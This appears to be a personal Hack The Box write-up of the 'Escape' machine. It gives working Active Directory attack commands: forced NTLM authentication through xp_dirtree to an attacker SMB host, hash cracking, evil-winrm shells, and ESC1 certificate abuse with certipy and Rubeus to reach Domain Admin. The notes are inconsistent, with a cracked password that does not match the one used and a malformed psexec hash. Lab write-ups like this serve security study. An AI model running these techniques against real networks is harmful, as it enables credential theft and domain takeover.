---
title: HTB Escape
date: 2024-08-04
author: kei5uke
draft: true
description: Writeup for HTB Escape
tags:
  - windows
  - writeup
---

# Enumeration

```
nmap 10.129.228.253 -sC -sV -p- -A -oN nmap_tcp.txt -T4 --min-rate 10000
Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-03 22:55 CEST
Nmap scan report for 10.129.228.253
Host is up (0.038s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-04 04:56:08Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-08-04T04:57:43+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2024-08-04T04:57:43+00:00; +8h00m00s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.228.253:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-08-04T04:45:45
|_Not valid after:  2054-08-04T04:45:45
|_ssl-date: 2024-08-04T04:57:43+00:00; +8h00m00s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.228.253:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2024-08-04T04:57:43+00:00; +8h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2024-08-04T04:57:43+00:00; +8h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
63980/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
| smb2-time: 
|   date: 2024-08-04T04:57:02
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
```

```
nmap 10.129.228.253 -sU --top-port=100 -oN nmap_udp.txt -T4 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-04 00:14 CEST
Nmap scan report for 10.129.228.253
Host is up (0.039s latency).
Not shown: 98 open|filtered udp ports (no-response)
PORT    STATE SERVICE
53/udp  open  domain
123/udp open  ntp
```

## SMB

```
smbclient -L \\\\10.129.228.253
Password for [WORKGROUP\root]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Public          Disk      
	SYSVOL          Disk      Logon server share
```

Found SQL Server Procedures.pdf

PublicUser : GuestUserCantWrite1 # Database user?

brandon.brown@sequel.htb

ryan

tom

## MSSQL with Cred

`impacket-mssqlclient PublicUser:GuestUserCantWrite1@10.129.228.253`

Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 

select user_name() — guest

dbs — master, tempdb, model, msdb

Got NTLM hash 

`xp_dirtree '\\10.10.14.8\any\thing'`

```
[SMB] NTLMv2-SSP Client   : 10.129.228.253
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:389c0344e16a32f3:F70C0E3862175821D1D448F6F25FD989:01010000000000008066C8C608E6DA01C0AA26A4CD94140000000000020008004F00590051004E0001001E00570049004E002D0037005A005600350057003600520037004D004B00540004003400570049004E002D0037005A005600350057003600520037004D004B0054002E004F00590051004E002E004C004F00430041004C00030014004F00590051004E002E004C004F00430041004C00050014004F00590051004E002E004C004F00430041004C00070008008066C8C608E6DA0106000400020000000800300030000000000000000000000000300000716B455DC169B032C70F2088D155498D6125B1B16D8B2D6878D00F4AD2B834BA0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0038000000000000000000
```

Not works

`impacket-psexec -hashes 0DDD0AD760443ECD562EA647ACFB178D:010100000000000080C0EB2F81E6DA01EF8E2309CC1517340000000002000800520033004400580001001E00570049004E002D00360056005A0030004700340033004F0034005200520004003400570049004E002D00360056005A0030004700340033004F003400520052002E0052003300440058002E004C004F00430041004C000300140052003300440058002E004C004F00430041004C000500140052003300440058002E004C004F00430041004C000700080080C0EB2F81E6DA0106000400020000000800300030000000000000000000000000300000716B455DC169B032C70F2088D155498D6125B1B16D8B2D6878D00F4AD2B834BA0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00340031000000000000000000 sequel\sql_svc@10.129.228.253`

Cracked the hash: REGGIE1234ronnie

`hashcat -m 5600 sql_svc.hash /usr/share/wordlists/rockyou.txt.gz --force`

This leads to shell as sql_svc

# Shell

`evil-winrm -i 10.129.228.253 -u sql_svc -p NuclearMosquito3`

In the sql error log, ryan left something useful.

![[HTB Escape - Screenshot_2024-08-04_at_16.29.15.png]]

`evil-winrm -i sequel.htb -u 'Ryan.Cooper' -p 'NuclearMosquito3'` 

and you get user.txt

`certipy find -u Ryan.Cooper -p NuclearMosquito3 -dc-ip 10.129.228.253 -vulnerable`

and its vulnerble to EC1

`certipy req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target sequel.htb -ca sequel-dc-ca -template UserAuthentication`

`certipy auth -pfx administrator_dc.pfx` didnt work

so used this instead

`certipy auth -ldap-shell -pfx administrator.pfx -username 'administrator' -domain 'sequel.htb' -dc-ip 10.129.186.1`

and 

`add_user_to_group Ryan.Cooper 'Domain Admins'`

and now you are root

## Alternative way of using Cert

`.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials`
